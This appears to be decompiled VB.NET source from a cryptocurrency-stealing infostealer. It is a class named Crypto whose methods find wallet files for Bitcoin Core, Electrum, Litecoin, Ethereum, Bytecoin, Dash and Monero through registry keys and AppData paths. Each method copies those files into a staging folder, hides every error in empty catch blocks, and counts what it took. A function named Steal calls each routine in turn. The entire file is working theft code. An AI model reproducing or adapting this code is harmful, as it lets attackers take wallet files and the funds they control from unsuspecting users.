Imports System
Imports System.IO
Imports Microsoft.Win32

Namespace Main.Tools
	' Token: 0x02000013 RID: 19
	Friend Class Crypto
		' Token: 0x06000069 RID: 105 RVA: 0x000063C4 File Offset: 0x000045C4
		Public Shared Sub BitcoinCore(directorypath As String)
			Try
				Using registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt")
					Try
						Directory.CreateDirectory(directorypath + "\BitcoinCore\")
						File.Copy(registryKey.GetValue("strDataDir").ToString() + "\wallet.dat", directorypath + "\BitcoinCore\wallet.dat")
						Crypto.count += 1
					Catch ex As Exception
					End Try
				End Using
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600006A RID: 106 RVA: 0x0000647C File Offset: 0x0000467C
		Public Shared Sub Electrum(directorypath As String)
			Try
				For Each fileInfo As FileInfo In New DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\Electrum\wallets").GetFiles()
					Directory.CreateDirectory(directorypath + "\Electrum\")
					fileInfo.CopyTo(directorypath + "\Electrum\" + fileInfo.Name)
					Crypto.count += 1
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600006B RID: 107 RVA: 0x00006504 File Offset: 0x00004704
		Public Shared Sub LTC(directorypath As String)
			Try
				Using registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt")
					Try
						Directory.CreateDirectory(directorypath + "\LitecoinCore\")
						File.Copy(registryKey.GetValue("strDataDir").ToString() + "\wallet.dat", directorypath + "\LitecoinCore\wallet.dat")
						Crypto.count += 1
					Catch ex As Exception
					End Try
				End Using
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600006C RID: 108 RVA: 0x000065BC File Offset: 0x000047BC
		Public Shared Sub ETH(directorypath As String)
			Try
				For Each fileInfo As FileInfo In New DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\Ethereum\keystore").GetFiles()
					Directory.CreateDirectory(directorypath + "\Ethereum\")
					fileInfo.CopyTo(directorypath + "\Ethereum\" + fileInfo.Name)
					Crypto.count += 1
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600006D RID: 109 RVA: 0x00006644 File Offset: 0x00004844
		Public Shared Sub BCN(directorypath As String)
			Try
				For Each fileInfo As FileInfo In New DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\bytecoin").GetFiles()
					Directory.CreateDirectory(directorypath + "\Bytecoin\")
					If fileInfo.Extension.Equals(".wallet") Then
						fileInfo.CopyTo(directorypath + "\Bytecoin\" + fileInfo.Name)
						Crypto.count += 1
					End If
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600006E RID: 110 RVA: 0x000066DC File Offset: 0x000048DC
		Public Shared Sub DSH(directorypath As String)
			Try
				Using registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt")
					Try
						Directory.CreateDirectory(directorypath + "\DashCore\")
						File.Copy(registryKey.GetValue("strDataDir").ToString() + "\wallet.dat", directorypath + "\DashCore\wallet.dat")
						Crypto.count += 1
					Catch ex As Exception
					End Try
				End Using
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600006F RID: 111 RVA: 0x00006794 File Offset: 0x00004994
		Public Shared Sub XMR(directorypath As String)
			Try
				Using registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core")
					Try
						Directory.CreateDirectory(directorypath + "\Monero\")
						Dim text As String = registryKey.GetValue("wallet_path").ToString().Replace("/", "\")
						Directory.CreateDirectory(directorypath + "\Monero\")
						File.Copy(text, directorypath + "\Monero\" + text.Split(New Char() { "\"c })(text.Split(New Char() { "\"c }).Length - 1))
						Crypto.count += 1
					Catch ex As Exception
					End Try
				End Using
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x06000070 RID: 112 RVA: 0x000024E4 File Offset: 0x000006E4
		Public Shared Sub ZEC(directorypath As String)
		End Sub

		' Token: 0x06000071 RID: 113 RVA: 0x0000688C File Offset: 0x00004A8C
		Public Shared Function Steal(cryptoDir As String) As Integer
			Crypto.BCN(cryptoDir)
			Crypto.BitcoinCore(cryptoDir)
			Crypto.DSH(cryptoDir)
			Crypto.Electrum(cryptoDir)
			Crypto.ETH(cryptoDir)
			Crypto.LTC(cryptoDir)
			Crypto.XMR(cryptoDir)
			Crypto.ZEC(cryptoDir)
			Return Crypto.count
		End Function

		' Token: 0x04000094 RID: 148
		Public Shared count As Integer = 0
	End Class
End Namespace
